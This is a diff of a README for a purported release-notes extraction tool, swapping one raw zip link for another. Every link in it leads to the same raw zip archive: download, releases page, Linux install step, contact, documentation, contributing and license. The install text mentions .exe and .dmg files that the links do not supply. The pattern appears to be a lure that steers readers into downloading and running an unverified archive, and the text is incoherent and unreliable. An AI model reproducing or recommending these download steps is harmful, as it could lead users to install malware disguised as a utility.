@@ -1,6 +1,6 @@
 # 🎉 update-notes-extractor - Extract Release Notes Effortlessly
 
-[![Download Latest Release](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip)
+[![Download Latest Release](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip)
 
 ## 📖 Introduction
 
@@ -10,18 +10,18 @@ update-notes-extractor is a package that extracts and structures release notes f
 
 To get started with update-notes-extractor, follow these simple steps:
 
-1. **Visit our Releases Page**: Click [here to download](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip) the latest version of update-notes-extractor. This page contains all the available versions.
+1. **Visit our Releases Page**: Click [here to download](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip) the latest version of update-notes-extractor. This page contains all the available versions.
 
 2. **Download the Application**: On the Releases page, look for the most recent version. There, you will see various files available for download. Choose the appropriate file for your operating system. 
 
 3. **Install the Application**:
    - For Windows: Download the `.exe` file. Once downloaded, double-click the file to start the installation.
    - For macOS: Download the `.dmg` file. Open it and drag the application to your Applications folder.
-   - For Linux: Download the `https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip` file. Extract it and follow the instructions provided in the `README` inside the extracted folder.
+   - For Linux: Download the `https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip` file. Extract it and follow the instructions provided in the `README` inside the extracted folder.
 
 ## 📥 Download & Install
 
-To download update-notes-extractor, please visit the [Releases page](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip). Follow the steps mentioned above to download and install the application. 
+To download update-notes-extractor, please visit the [Releases page](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip). Follow the steps mentioned above to download and install the application. 
 
 1. After installation is complete, find the application in your program list.
 2. Launch the application by double-clicking the icon.
@@ -74,12 +74,12 @@ For help, join our community on GitHub Discussions. You can ask questions, repor
 
 ## 📞 Contact
 
-Feel free to reach out for any queries at [https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip).
+Feel free to reach out for any queries at [https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip).
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip)
-- [Contributing](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip)
-- [License](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/update_extractor_notes_2.0.zip)
+- [Documentation](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip)
+- [Contributing](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip)
+- [License](https://github.com/veer4557/update-notes-extractor/raw/refs/heads/main/update_notes_extractor/notes_update_extractor_v1.4.zip)
 
 Thank you for choosing update-notes-extractor. Happy extracting!
